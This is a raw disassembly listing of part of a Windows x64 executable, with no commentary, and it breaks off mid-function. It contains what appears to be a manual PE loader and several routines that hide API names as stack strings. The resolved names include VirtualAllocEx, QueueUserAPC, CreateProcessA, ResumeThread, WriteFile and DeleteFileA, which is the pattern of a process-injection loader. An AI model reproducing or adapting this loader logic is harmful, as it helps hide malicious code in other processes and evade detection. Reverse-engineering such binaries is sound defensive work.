   140002567:	45 8b e8             	mov    %r8d,%r13d
   14000256a:	44 8b 64 24 30       	mov    0x30(%rsp),%r12d
   14000256f:	33 db                	xor    %ebx,%ebx
   140002571:	45 85 e4             	test   %r12d,%r12d
   140002574:	0f 84 96 00 00 00    	je     0x140002610
   14000257a:	44 8b 6c 24 24       	mov    0x24(%rsp),%r13d
   14000257f:	be 02 00 00 00       	mov    $0x2,%esi
   140002584:	41 be 20 00 00 00    	mov    $0x20,%r14d
   14000258a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002590:	8d 04 9b             	lea    (%rbx,%rbx,4),%eax
   140002593:	8d 0c c5 00 00 00 00 	lea    0x0(,%rax,8),%ecx
   14000259a:	41 03 cd             	add    %r13d,%ecx
   14000259d:	44 8b 4c 29 0c       	mov    0xc(%rcx,%rbp,1),%r9d
   1400025a2:	8b 54 29 08          	mov    0x8(%rcx,%rbp,1),%edx
   1400025a6:	8b 4c 29 24          	mov    0x24(%rcx,%rbp,1),%ecx
   1400025aa:	8b c1                	mov    %ecx,%eax
   1400025ac:	25 00 00 00 40       	and    $0x40000000,%eax
   1400025b1:	0f ba e1 1d          	bt     $0x1d,%ecx
   1400025b5:	73 1a                	jae    0x1400025d1
   1400025b7:	85 c9                	test   %ecx,%ecx
   1400025b9:	79 08                	jns    0x1400025c3
   1400025bb:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   1400025c1:	eb 23                	jmp    0x1400025e6
   1400025c3:	85 c0                	test   %eax,%eax
   1400025c5:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400025cb:	45 0f 45 c6          	cmovne %r14d,%r8d
   1400025cf:	eb 15                	jmp    0x1400025e6
   1400025d1:	85 c9                	test   %ecx,%ecx
   1400025d3:	79 08                	jns    0x1400025dd
   1400025d5:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400025db:	eb 09                	jmp    0x1400025e6
   1400025dd:	85 c0                	test   %eax,%eax
   1400025df:	44 8b c6             	mov    %esi,%r8d
   1400025e2:	44 0f 45 c6          	cmovne %esi,%r8d
   1400025e6:	4b 8d 0c 0f          	lea    (%r15,%r9,1),%rcx
   1400025ea:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400025ef:	ff 15 db c4 01 00    	call   *0x1c4db(%rip)        # 0x14001ead0
   1400025f5:	ff c3                	inc    %ebx
   1400025f7:	41 3b dc             	cmp    %r12d,%ebx
   1400025fa:	7c 94                	jl     0x140002590
   1400025fc:	44 8b ac 24 a8 00 00 	mov    0xa8(%rsp),%r13d
   140002603:	00 
   140002604:	8b b4 24 98 00 00 00 	mov    0x98(%rsp),%esi
   14000260b:	44 8b 74 24 20       	mov    0x20(%rsp),%r14d
   140002610:	48 8b 0d b1 c5 01 00 	mov    0x1c5b1(%rip),%rcx        # 0x14001ebc8
   140002617:	48 8d 15 ba e6 00 00 	lea    0xe6ba(%rip),%rdx        # 0x140010cd8
   14000261e:	ff 15 94 c4 01 00    	call   *0x1c494(%rip)        # 0x14001eab8
   140002624:	48 85 c0             	test   %rax,%rax
   140002627:	74 0f                	je     0x140002638
   140002629:	45 8b c5             	mov    %r13d,%r8d
   14000262c:	49 8b d7             	mov    %r15,%rdx
   14000262f:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002636:	ff d0                	call   *%rax
   140002638:	ba 0b 02 00 00       	mov    $0x20b,%edx
   14000263d:	66 3b fa             	cmp    %dx,%di
   140002640:	75 6b                	jne    0x1400026ad
   140002642:	41 8d 8e a0 00 00 00 	lea    0xa0(%r14),%ecx
   140002649:	8d 41 08             	lea    0x8(%rcx),%eax
   14000264c:	3b c6                	cmp    %esi,%eax
   14000264e:	77 54                	ja     0x1400026a4
   140002650:	8b 3c 29             	mov    (%rcx,%rbp,1),%edi
   140002653:	85 ff                	test   %edi,%edi
   140002655:	74 45                	je     0x14000269c
   140002657:	8b 5c 29 04          	mov    0x4(%rcx,%rbp,1),%ebx
   14000265b:	85 db                	test   %ebx,%ebx
   14000265d:	74 3d                	je     0x14000269c
   14000265f:	8d 04 3b             	lea    (%rbx,%rdi,1),%eax
   140002662:	41 3b c5             	cmp    %r13d,%eax
   140002665:	77 35                	ja     0x14000269c
   140002667:	48 8b 0d 5a c5 01 00 	mov    0x1c55a(%rip),%rcx        # 0x14001ebc8
   14000266e:	48 8d 15 7b e6 00 00 	lea    0xe67b(%rip),%rdx        # 0x140010cf0
   140002675:	ff 15 3d c4 01 00    	call   *0x1c43d(%rip)        # 0x14001eab8
   14000267b:	4c 8b c8             	mov    %rax,%r9
   14000267e:	48 85 c0             	test   %rax,%rax
   140002681:	74 14                	je     0x140002697
   140002683:	b8 ab aa aa aa       	mov    $0xaaaaaaab,%eax
   140002688:	49 8d 0c 3f          	lea    (%r15,%rdi,1),%rcx
   14000268c:	f7 e3                	mul    %ebx
   14000268e:	4d 8b c7             	mov    %r15,%r8
   140002691:	c1 ea 03             	shr    $0x3,%edx
   140002694:	41 ff d1             	call   *%r9
   140002697:	ba 0b 02 00 00       	mov    $0x20b,%edx
   14000269c:	0f b7 bc 24 a0 00 00 	movzwl 0xa0(%rsp),%edi
   1400026a3:	00 
   1400026a4:	41 8d 8e d0 00 00 00 	lea    0xd0(%r14),%ecx
   1400026ab:	eb 07                	jmp    0x1400026b4
   1400026ad:	41 8d 8e c0 00 00 00 	lea    0xc0(%r14),%ecx
   1400026b4:	8d 41 08             	lea    0x8(%rcx),%eax
   1400026b7:	3b c6                	cmp    %esi,%eax
   1400026b9:	77 6d                	ja     0x140002728
   1400026bb:	8b c1                	mov    %ecx,%eax
   1400026bd:	8b 0c 29             	mov    (%rcx,%rbp,1),%ecx
   1400026c0:	85 c9                	test   %ecx,%ecx
   1400026c2:	74 64                	je     0x140002728
   1400026c4:	83 7c 28 04 00       	cmpl   $0x0,0x4(%rax,%rbp,1)
   1400026c9:	76 5d                	jbe    0x140002728
   1400026cb:	66 3b fa             	cmp    %dx,%di
   1400026ce:	75 2e                	jne    0x1400026fe
   1400026d0:	4a 8b 5c 39 18       	mov    0x18(%rcx,%r15,1),%rbx
   1400026d5:	48 85 db             	test   %rbx,%rbx
   1400026d8:	74 4e                	je     0x140002728
   1400026da:	48 8b 03             	mov    (%rbx),%rax
   1400026dd:	48 85 c0             	test   %rax,%rax
   1400026e0:	74 46                	je     0x140002728
   1400026e2:	45 33 c0             	xor    %r8d,%r8d
   1400026e5:	ba 01 00 00 00       	mov    $0x1,%edx
   1400026ea:	49 8b cf             	mov    %r15,%rcx
   1400026ed:	ff d0                	call   *%rax
   1400026ef:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400026f3:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   1400026f7:	48 85 c0             	test   %rax,%rax
   1400026fa:	75 e6                	jne    0x1400026e2
   1400026fc:	eb 2a                	jmp    0x140002728
   1400026fe:	42 8b 44 39 0c       	mov    0xc(%rcx,%r15,1),%eax
   140002703:	85 c0                	test   %eax,%eax
   140002705:	74 21                	je     0x140002728
   140002707:	8b d8                	mov    %eax,%ebx
   140002709:	8b 00                	mov    (%rax),%eax
   14000270b:	85 c0                	test   %eax,%eax
   14000270d:	74 19                	je     0x140002728
   14000270f:	90                   	nop
   140002710:	45 33 c0             	xor    %r8d,%r8d
   140002713:	ba 01 00 00 00       	mov    $0x1,%edx
   140002718:	49 8b cf             	mov    %r15,%rcx
   14000271b:	ff d0                	call   *%rax
   14000271d:	8b 43 04             	mov    0x4(%rbx),%eax
   140002720:	48 8d 5b 04          	lea    0x4(%rbx),%rbx
   140002724:	85 c0                	test   %eax,%eax
   140002726:	75 e8                	jne    0x140002710
   140002728:	8b 44 24 34          	mov    0x34(%rsp),%eax
   14000272c:	85 c0                	test   %eax,%eax
   14000272e:	74 0a                	je     0x14000273a
   140002730:	41 3b c5             	cmp    %r13d,%eax
   140002733:	73 05                	jae    0x14000273a
   140002735:	49 03 c7             	add    %r15,%rax
   140002738:	ff d0                	call   *%rax
   14000273a:	4c 8b 6c 24 50       	mov    0x50(%rsp),%r13
   14000273f:	4c 8b 64 24 58       	mov    0x58(%rsp),%r12
   140002744:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140002749:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000274e:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002753:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   140002758:	48 83 c4 78          	add    $0x78,%rsp
   14000275c:	41 5e                	pop    %r14
   14000275e:	5d                   	pop    %rbp
   14000275f:	c3                   	ret
   140002760:	40 55                	rex push %rbp
   140002762:	48 8b ec             	mov    %rsp,%rbp
   140002765:	48 83 ec 60          	sub    $0x60,%rsp
   140002769:	48 8b 05 90 b8 01 00 	mov    0x1b890(%rip),%rax        # 0x14001e000
   140002770:	48 33 c4             	xor    %rsp,%rax
   140002773:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002777:	48 8b 0d 4a c4 01 00 	mov    0x1c44a(%rip),%rcx        # 0x14001ebc8
   14000277e:	48 85 c9             	test   %rcx,%rcx
   140002781:	0f 84 fa 00 00 00    	je     0x140002881
   140002787:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000278b:	c7 45 c0 56 69 72 74 	movl   $0x74726956,-0x40(%rbp)
   140002792:	c7 45 c4 75 61 6c 41 	movl   $0x416c6175,-0x3c(%rbp)
   140002799:	c7 45 c8 6c 6c 6f 63 	movl   $0x636f6c6c,-0x38(%rbp)
   1400027a0:	c6 45 cc 00          	movb   $0x0,-0x34(%rbp)
   1400027a4:	ff 15 56 d8 00 00    	call   *0xd856(%rip)        # 0x140010000
   1400027aa:	48 8b 0d 17 c4 01 00 	mov    0x1c417(%rip),%rcx        # 0x14001ebc8
   1400027b1:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   1400027b5:	48 89 05 04 c3 01 00 	mov    %rax,0x1c304(%rip)        # 0x14001eac0
   1400027bc:	c7 45 e8 56 69 72 74 	movl   $0x74726956,-0x18(%rbp)
   1400027c3:	c7 45 ec 75 61 6c 41 	movl   $0x416c6175,-0x14(%rbp)
   1400027ca:	c7 45 f0 6c 6c 6f 63 	movl   $0x636f6c6c,-0x10(%rbp)
   1400027d1:	66 c7 45 f4 45 78    	movw   $0x7845,-0xc(%rbp)
   1400027d7:	c6 45 f6 00          	movb   $0x0,-0xa(%rbp)
   1400027db:	ff 15 1f d8 00 00    	call   *0xd81f(%rip)        # 0x140010000
   1400027e1:	48 8b 0d e0 c3 01 00 	mov    0x1c3e0(%rip),%rcx        # 0x14001ebc8
   1400027e8:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400027ec:	48 89 05 d5 c2 01 00 	mov    %rax,0x1c2d5(%rip)        # 0x14001eac8
   1400027f3:	c7 45 d0 56 69 72 74 	movl   $0x74726956,-0x30(%rbp)
   1400027fa:	c7 45 d4 75 61 6c 50 	movl   $0x506c6175,-0x2c(%rbp)
   140002801:	c7 45 d8 72 6f 74 65 	movl   $0x65746f72,-0x28(%rbp)
   140002808:	66 c7 45 dc 63 74    	movw   $0x7463,-0x24(%rbp)
   14000280e:	c6 45 de 00          	movb   $0x0,-0x22(%rbp)
   140002812:	ff 15 e8 d7 00 00    	call   *0xd7e8(%rip)        # 0x140010000
   140002818:	48 8b 0d a9 c3 01 00 	mov    0x1c3a9(%rip),%rcx        # 0x14001ebc8
   14000281f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002823:	48 89 05 a6 c2 01 00 	mov    %rax,0x1c2a6(%rip)        # 0x14001ead0
   14000282a:	c7 45 c0 56 69 72 74 	movl   $0x74726956,-0x40(%rbp)
   140002831:	c7 45 c4 75 61 6c 46 	movl   $0x466c6175,-0x3c(%rbp)
   140002838:	c7 45 c8 72 65 65 45 	movl   $0x45656572,-0x38(%rbp)
   14000283f:	66 c7 45 cc 78 00    	movw   $0x78,-0x34(%rbp)
   140002845:	ff 15 b5 d7 00 00    	call   *0xd7b5(%rip)        # 0x140010000
   14000284b:	66 0f 6f 05 2d e5 00 	movdqa 0xe52d(%rip),%xmm0        # 0x140010d80
   140002852:	00 
   140002853:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140002857:	48 8b 0d 6a c3 01 00 	mov    0x1c36a(%rip),%rcx        # 0x14001ebc8
   14000285e:	f3 0f 7f 45 d0       	movdqu %xmm0,-0x30(%rbp)
   140002863:	48 89 05 6e c2 01 00 	mov    %rax,0x1c26e(%rip)        # 0x14001ead8
   14000286a:	66 c7 45 e0 72 79    	movw   $0x7972,-0x20(%rbp)
   140002870:	c6 45 e2 00          	movb   $0x0,-0x1e(%rbp)
   140002874:	ff 15 86 d7 00 00    	call   *0xd786(%rip)        # 0x140010000
   14000287a:	48 89 05 5f c2 01 00 	mov    %rax,0x1c25f(%rip)        # 0x14001eae0
   140002881:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140002885:	48 33 cc             	xor    %rsp,%rcx
   140002888:	e8 83 08 00 00       	call   0x140003110
   14000288d:	48 83 c4 60          	add    $0x60,%rsp
   140002891:	5d                   	pop    %rbp
   140002892:	c3                   	ret
   140002893:	cc                   	int3
   140002894:	cc                   	int3
   140002895:	cc                   	int3
   140002896:	cc                   	int3
   140002897:	cc                   	int3
   140002898:	cc                   	int3
   140002899:	cc                   	int3
   14000289a:	cc                   	int3
   14000289b:	cc                   	int3
   14000289c:	cc                   	int3
   14000289d:	cc                   	int3
   14000289e:	cc                   	int3
   14000289f:	cc                   	int3
   1400028a0:	40 55                	rex push %rbp
   1400028a2:	48 8b ec             	mov    %rsp,%rbp
   1400028a5:	48 83 ec 50          	sub    $0x50,%rsp
   1400028a9:	48 8b 05 50 b7 01 00 	mov    0x1b750(%rip),%rax        # 0x14001e000
   1400028b0:	48 33 c4             	xor    %rsp,%rax
   1400028b3:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400028b7:	48 8b 0d 0a c3 01 00 	mov    0x1c30a(%rip),%rcx        # 0x14001ebc8
   1400028be:	48 85 c9             	test   %rcx,%rcx
   1400028c1:	0f 84 e4 00 00 00    	je     0x1400029ab
   1400028c7:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400028cb:	c7 45 e0 43 72 65 61 	movl   $0x61657243,-0x20(%rbp)
   1400028d2:	c7 45 e4 74 65 50 72 	movl   $0x72506574,-0x1c(%rbp)
   1400028d9:	c7 45 e8 6f 63 65 73 	movl   $0x7365636f,-0x18(%rbp)
   1400028e0:	66 c7 45 ec 73 41    	movw   $0x4173,-0x14(%rbp)
   1400028e6:	c6 45 ee 00          	movb   $0x0,-0x12(%rbp)
   1400028ea:	ff 15 10 d7 00 00    	call   *0xd710(%rip)        # 0x140010000
   1400028f0:	48 8b 0d d1 c2 01 00 	mov    0x1c2d1(%rip),%rcx        # 0x14001ebc8
   1400028f7:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400028fb:	48 89 05 e6 c1 01 00 	mov    %rax,0x1c1e6(%rip)        # 0x14001eae8
   140002902:	c7 45 d0 52 65 73 75 	movl   $0x75736552,-0x30(%rbp)
   140002909:	c7 45 d4 6d 65 54 68 	movl   $0x6854656d,-0x2c(%rbp)
   140002910:	c7 45 d8 72 65 61 64 	movl   $0x64616572,-0x28(%rbp)
   140002917:	c6 45 dc 00          	movb   $0x0,-0x24(%rbp)
   14000291b:	ff 15 df d6 00 00    	call   *0xd6df(%rip)        # 0x140010000
   140002921:	48 8b 0d a0 c2 01 00 	mov    0x1c2a0(%rip),%rcx        # 0x14001ebc8
   140002928:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   14000292c:	48 89 05 bd c1 01 00 	mov    %rax,0x1c1bd(%rip)        # 0x14001eaf0
   140002933:	c7 45 e0 43 6c 6f 73 	movl   $0x736f6c43,-0x20(%rbp)
   14000293a:	c7 45 e4 65 48 61 6e 	movl   $0x6e614865,-0x1c(%rbp)
   140002941:	c7 45 e8 64 6c 65 00 	movl   $0x656c64,-0x18(%rbp)
   140002948:	ff 15 b2 d6 00 00    	call   *0xd6b2(%rip)        # 0x140010000
   14000294e:	48 8b 0d 73 c2 01 00 	mov    0x1c273(%rip),%rcx        # 0x14001ebc8
   140002955:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140002959:	48 89 05 98 c1 01 00 	mov    %rax,0x1c198(%rip)        # 0x14001eaf8
   140002960:	c7 45 f0 53 6c 65 65 	movl   $0x65656c53,-0x10(%rbp)
   140002967:	66 c7 45 f4 70 00    	movw   $0x70,-0xc(%rbp)
   14000296d:	ff 15 8d d6 00 00    	call   *0xd68d(%rip)        # 0x140010000
   140002973:	48 8b 0d 4e c2 01 00 	mov    0x1c24e(%rip),%rcx        # 0x14001ebc8
   14000297a:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   14000297e:	48 89 05 7b c1 01 00 	mov    %rax,0x1c17b(%rip)        # 0x14001eb00
   140002985:	c7 45 d0 47 65 74 54 	movl   $0x54746547,-0x30(%rbp)
   14000298c:	c7 45 d4 69 63 6b 43 	movl   $0x436b6369,-0x2c(%rbp)
   140002993:	c7 45 d8 6f 75 6e 74 	movl   $0x746e756f,-0x28(%rbp)
   14000299a:	c6 45 dc 00          	movb   $0x0,-0x24(%rbp)
   14000299e:	ff 15 5c d6 00 00    	call   *0xd65c(%rip)        # 0x140010000
   1400029a4:	48 89 05 5d c1 01 00 	mov    %rax,0x1c15d(%rip)        # 0x14001eb08
   1400029ab:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   1400029af:	48 33 cc             	xor    %rsp,%rcx
   1400029b2:	e8 59 07 00 00       	call   0x140003110
   1400029b7:	48 83 c4 50          	add    $0x50,%rsp
   1400029bb:	5d                   	pop    %rbp
   1400029bc:	c3                   	ret
   1400029bd:	cc                   	int3
   1400029be:	cc                   	int3
   1400029bf:	cc                   	int3
   1400029c0:	40 55                	rex push %rbp
   1400029c2:	48 8b ec             	mov    %rsp,%rbp
   1400029c5:	48 83 ec 70          	sub    $0x70,%rsp
   1400029c9:	48 8b 05 30 b6 01 00 	mov    0x1b630(%rip),%rax        # 0x14001e000
   1400029d0:	48 33 c4             	xor    %rsp,%rax
   1400029d3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400029d7:	48 8b 0d ea c1 01 00 	mov    0x1c1ea(%rip),%rcx        # 0x14001ebc8
   1400029de:	48 85 c9             	test   %rcx,%rcx
   1400029e1:	0f 84 db 00 00 00    	je     0x140002ac2
   1400029e7:	66 0f 6f 05 b1 e3 00 	movdqa 0xe3b1(%rip),%xmm0        # 0x140010da0
   1400029ee:	00 
   1400029ef:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400029f3:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   1400029f8:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   1400029fc:	ff 15 fe d5 00 00    	call   *0xd5fe(%rip)        # 0x140010000
   140002a02:	48 8b 0d bf c1 01 00 	mov    0x1c1bf(%rip),%rcx        # 0x14001ebc8
   140002a09:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140002a0d:	48 89 05 fc c0 01 00 	mov    %rax,0x1c0fc(%rip)        # 0x14001eb10
   140002a14:	c7 45 b0 51 75 65 75 	movl   $0x75657551,-0x50(%rbp)
   140002a1b:	c7 45 b4 65 55 73 65 	movl   $0x65735565,-0x4c(%rbp)
   140002a22:	c7 45 b8 72 41 50 43 	movl   $0x43504172,-0x48(%rbp)
   140002a29:	c6 45 bc 00          	movb   $0x0,-0x44(%rbp)
   140002a2d:	ff 15 cd d5 00 00    	call   *0xd5cd(%rip)        # 0x140010000
   140002a33:	66 0f 6f 05 25 e3 00 	movdqa 0xe325(%rip),%xmm0        # 0x140010d60
   140002a3a:	00 
   140002a3b:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002a3f:	48 8b 0d 82 c1 01 00 	mov    0x1c182(%rip),%rcx        # 0x14001ebc8
   140002a46:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140002a4b:	48 89 05 c6 c0 01 00 	mov    %rax,0x1c0c6(%rip)        # 0x14001eb18
   140002a52:	c7 45 e8 65 63 74 00 	movl   $0x746365,-0x18(%rbp)
   140002a59:	ff 15 a1 d5 00 00    	call   *0xd5a1(%rip)        # 0x140010000
   140002a5f:	66 0f 6f 05 d9 e2 00 	movdqa 0xe2d9(%rip),%xmm0        # 0x140010d40
   140002a66:	00 
   140002a67:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002a6b:	48 8b 0d 56 c1 01 00 	mov    0x1c156(%rip),%rcx        # 0x14001ebc8
   140002a72:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002a77:	48 89 05 a2 c0 01 00 	mov    %rax,0x1c0a2(%rip)        # 0x14001eb20
   140002a7e:	66 c7 45 d0 73 73    	movw   $0x7373,-0x30(%rbp)
   140002a84:	c6 45 d2 00          	movb   $0x0,-0x2e(%rbp)
   140002a88:	ff 15 72 d5 00 00    	call   *0xd572(%rip)        # 0x140010000
   140002a8e:	48 8b 0d 33 c1 01 00 	mov    0x1c133(%rip),%rcx        # 0x14001ebc8
   140002a95:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140002a99:	48 89 05 88 c0 01 00 	mov    %rax,0x1c088(%rip)        # 0x14001eb28
   140002aa0:	c7 45 b0 43 72 65 61 	movl   $0x61657243,-0x50(%rbp)
   140002aa7:	c7 45 b4 74 65 46 69 	movl   $0x69466574,-0x4c(%rbp)
   140002aae:	c7 45 b8 6c 65 41 00 	movl   $0x41656c,-0x48(%rbp)
   140002ab5:	ff 15 45 d5 00 00    	call   *0xd545(%rip)        # 0x140010000
   140002abb:	48 89 05 6e c0 01 00 	mov    %rax,0x1c06e(%rip)        # 0x14001eb30
   140002ac2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002ac6:	48 33 cc             	xor    %rsp,%rcx
   140002ac9:	e8 42 06 00 00       	call   0x140003110
   140002ace:	48 83 c4 70          	add    $0x70,%rsp
   140002ad2:	5d                   	pop    %rbp
   140002ad3:	c3                   	ret
   140002ad4:	cc                   	int3
   140002ad5:	cc                   	int3
   140002ad6:	cc                   	int3
   140002ad7:	cc                   	int3
   140002ad8:	cc                   	int3
   140002ad9:	cc                   	int3
   140002ada:	cc                   	int3
   140002adb:	cc                   	int3
   140002adc:	cc                   	int3
   140002add:	cc                   	int3
   140002ade:	cc                   	int3
   140002adf:	cc                   	int3
   140002ae0:	40 55                	rex push %rbp
   140002ae2:	48 8b ec             	mov    %rsp,%rbp
   140002ae5:	48 83 ec 60          	sub    $0x60,%rsp
   140002ae9:	48 8b 05 10 b5 01 00 	mov    0x1b510(%rip),%rax        # 0x14001e000
   140002af0:	48 33 c4             	xor    %rsp,%rax
   140002af3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002af7:	48 8b 0d ca c0 01 00 	mov    0x1c0ca(%rip),%rcx        # 0x14001ebc8
   140002afe:	48 85 c9             	test   %rcx,%rcx
   140002b01:	0f 84 60 01 00 00    	je     0x140002c67
   140002b07:	66 0f 6f 05 61 e2 00 	movdqa 0xe261(%rip),%xmm0        # 0x140010d70
   140002b0e:	00 
   140002b0f:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002b13:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140002b18:	66 c7 45 e8 67 41    	movw   $0x4167,-0x18(%rbp)
   140002b1e:	c6 45 ea 00          	movb   $0x0,-0x16(%rbp)
   140002b22:	ff 15 d8 d4 00 00    	call   *0xd4d8(%rip)        # 0x140010000
   140002b28:	48 8b 0d 99 c0 01 00 	mov    0x1c099(%rip),%rcx        # 0x14001ebc8
   140002b2f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002b33:	48 89 05 fe bf 01 00 	mov    %rax,0x1bffe(%rip)        # 0x14001eb38
   140002b3a:	c7 45 c0 4d 61 70 56 	movl   $0x5670614d,-0x40(%rbp)
   140002b41:	c7 45 c4 69 65 77 4f 	movl   $0x4f776569,-0x3c(%rbp)
   140002b48:	c7 45 c8 66 46 69 6c 	movl   $0x6c694666,-0x38(%rbp)
   140002b4f:	66 c7 45 cc 65 00    	movw   $0x65,-0x34(%rbp)
   140002b55:	ff 15 a5 d4 00 00    	call   *0xd4a5(%rip)        # 0x140010000
   140002b5b:	66 0f 6f 05 bd e1 00 	movdqa 0xe1bd(%rip),%xmm0        # 0x140010d20
   140002b62:	00 
   140002b63:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002b67:	48 8b 0d 5a c0 01 00 	mov    0x1c05a(%rip),%rcx        # 0x14001ebc8
   140002b6e:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   140002b73:	48 89 05 c6 bf 01 00 	mov    %rax,0x1bfc6(%rip)        # 0x14001eb40
   140002b7a:	ff 15 80 d4 00 00    	call   *0xd480(%rip)        # 0x140010000
   140002b80:	66 0f 6f 05 a8 e1 00 	movdqa 0xe1a8(%rip),%xmm0        # 0x140010d30
   140002b87:	00 
   140002b88:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002b8c:	48 8b 0d 35 c0 01 00 	mov    0x1c035(%rip),%rcx        # 0x14001ebc8
   140002b93:	f3 0f 7f 45 c0       	movdqu %xmm0,-0x40(%rbp)
   140002b98:	48 89 05 a9 bf 01 00 	mov    %rax,0x1bfa9(%rip)        # 0x14001eb48
   140002b9f:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   140002ba3:	ff 15 57 d4 00 00    	call   *0xd457(%rip)        # 0x140010000
   140002ba9:	48 8b 0d 18 c0 01 00 	mov    0x1c018(%rip),%rcx        # 0x14001ebc8
   140002bb0:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002bb4:	48 89 05 95 bf 01 00 	mov    %rax,0x1bf95(%rip)        # 0x14001eb50
   140002bbb:	c7 45 d8 47 65 74 46 	movl   $0x46746547,-0x28(%rbp)
   140002bc2:	c7 45 dc 69 6c 65 53 	movl   $0x53656c69,-0x24(%rbp)
   140002bc9:	c7 45 e0 69 7a 65 00 	movl   $0x657a69,-0x20(%rbp)
   140002bd0:	ff 15 2a d4 00 00    	call   *0xd42a(%rip)        # 0x140010000
   140002bd6:	48 8b 0d eb bf 01 00 	mov    0x1bfeb(%rip),%rcx        # 0x14001ebc8
   140002bdd:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002be1:	48 89 05 70 bf 01 00 	mov    %rax,0x1bf70(%rip)        # 0x14001eb58
   140002be8:	c7 45 c0 47 65 74 54 	movl   $0x54746547,-0x40(%rbp)
   140002bef:	c7 45 c4 65 6d 70 50 	movl   $0x50706d65,-0x3c(%rbp)
   140002bf6:	c7 45 c8 61 74 68 41 	movl   $0x41687461,-0x38(%rbp)
   140002bfd:	c6 45 cc 00          	movb   $0x0,-0x34(%rbp)
   140002c01:	ff 15 f9 d3 00 00    	call   *0xd3f9(%rip)        # 0x140010000
   140002c07:	48 8b 0d ba bf 01 00 	mov    0x1bfba(%rip),%rcx        # 0x14001ebc8
   140002c0e:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140002c12:	48 89 05 47 bf 01 00 	mov    %rax,0x1bf47(%rip)        # 0x14001eb60
   140002c19:	c7 45 d8 57 72 69 74 	movl   $0x74697257,-0x28(%rbp)
   140002c20:	c7 45 dc 65 46 69 6c 	movl   $0x6c694665,-0x24(%rbp)
   140002c27:	66 c7 45 e0 65 00    	movw   $0x65,-0x20(%rbp)
   140002c2d:	ff 15 cd d3 00 00    	call   *0xd3cd(%rip)        # 0x140010000
   140002c33:	48 8b 0d 8e bf 01 00 	mov    0x1bf8e(%rip),%rcx        # 0x14001ebc8
   140002c3a:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140002c3e:	48 89 05 23 bf 01 00 	mov    %rax,0x1bf23(%rip)        # 0x14001eb68
   140002c45:	c7 45 c0 44 65 6c 65 	movl   $0x656c6544,-0x40(%rbp)
   140002c4c:	c7 45 c4 74 65 46 69 	movl   $0x69466574,-0x3c(%rbp)
   140002c53:	c7 45 c8 6c 65 41 00 	movl   $0x41656c,-0x38(%rbp)
   140002c5a:	ff 15 a0 d3 00 00    	call   *0xd3a0(%rip)        # 0x140010000
   140002c60:	48 89 05 09 bf 01 00 	mov    %rax,0x1bf09(%rip)        # 0x14001eb70
   140002c67:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002c6b:	48 33 cc             	xor    %rsp,%rcx
   140002c6e:	e8 9d 04 00 00       	call   0x140003110
   140002c73:	48 83 c4 60          	add    $0x60,%rsp
   140002c77:	5d                   	pop    %rbp
   140002c78:	c3                   	ret
   140002c79:	cc                   	int3
   140002c7a:	cc                   	int3
   140002c7b:	cc                   	int3
   140002c7c:	cc                   	int3
   140002c7d:	cc                   	int3
   140002c7e:	cc                   	int3
   140002c7f:	cc                   	int3
   140002c80:	40 55                	rex push %rbp
   140002c82:	48 8b ec             	mov    %rsp,%rbp
   140002c85:	48 83 ec 60          	sub    $0x60,%rsp
   140002c89:	48 8b 05 70 b3 01 00 	mov    0x1b370(%rip),%rax        # 0x14001e000
   140002c90:	48 33 c4             	xor    %rsp,%rax
   140002c93:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002c97:	48 8b 05 12 be 01 00 	mov    0x1be12(%rip),%rax        # 0x14001eab0
   140002c9e:	48 85 c0             	test   %rax,%rax
   140002ca1:	0f 84 58 01 00 00    	je     0x140002dff
   140002ca7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
